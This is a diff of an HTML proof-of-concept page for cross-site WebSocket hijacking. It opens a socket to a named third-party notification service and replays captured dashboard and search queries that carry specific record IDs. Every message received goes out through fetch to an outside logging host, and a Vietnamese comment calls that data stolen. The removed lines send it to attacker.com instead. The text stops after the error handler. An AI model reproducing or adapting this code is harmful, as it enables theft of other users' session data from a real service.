@@ -1,24 +1,41 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>WebSocket Hijacking</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebSocket Exploit</title>
 </head>
 <body>
+    <h2>Exploiting WebSocket</h2>
+
     <script>
         var ws = new WebSocket("wss://notify.bubble.io");
-        
+
         ws.onopen = function() {
-            console.log("WebSocket Hijacked!");
-            ws.send(JSON.stringify({
-                action: "stealSession",
-                user: "victim"
-            }));
+            console.log("WebSocket connected!");
+
+            // Gửi các yêu cầu tương tự như trong Developer Tools
+            ws.send('t s main'); // Khởi tạo kết nối
+
+            // Yêu cầu 1: Lấy thông tin dashboard
+            ws.send('t g 1 id_update-test-ez-dashboard_23394_live_174245032638x8318422540894300_376943 last_change-test-ez-dashboard_23394_live_1743070553472 breaking_revision 5');
+
+            // Yêu cầu 2: Lấy thông tin dashboard khác
+            ws.send('t g 2 id_update-test-ez-dashboard_23394_live_171528074578x7799200180770400_349664');
+
+            // Yêu cầu 3: Lấy thông tin dashboard khác
+            ws.send('t g 3 id_update-test-ez-dashboard_23394_live_171673893947x6274530423205550_349665');
+
+            // Yêu cầu 4: Tìm kiếm
+            ws.send('t g 4 search_updatefd3f31444d8b7e3d3a27b24c9fcaeab7e3a1743459521076 search_updatefd5c2a2f21b2eba2e73d3bc1df390a1743459521076 search_updateDate05b7e1b846e4c321f03c2d0c1be94_1743459521100 id_update-test-ez-dashboard_23394_live_171673893947x6274530423205550_349665 id_update-test-ez-dashboard_23394');
         };
 
         ws.onmessage = function(event) {
-            console.log("Received:", event.data);
-            fetch("https://attacker.com/log?data=" + encodeURIComponent(event.data));
+            console.log("Data received:", event.data);
+
+            // Gửi dữ liệu đánh cắp về server attacker
+            fetch("https://sites.id.vn/log.php?data=" + encodeURIComponent(event.data));
         };
-    </script>
-</body>
-</html>
+
+        ws.onerror = function(error) {
+            console.log("WebSocket error:", error);
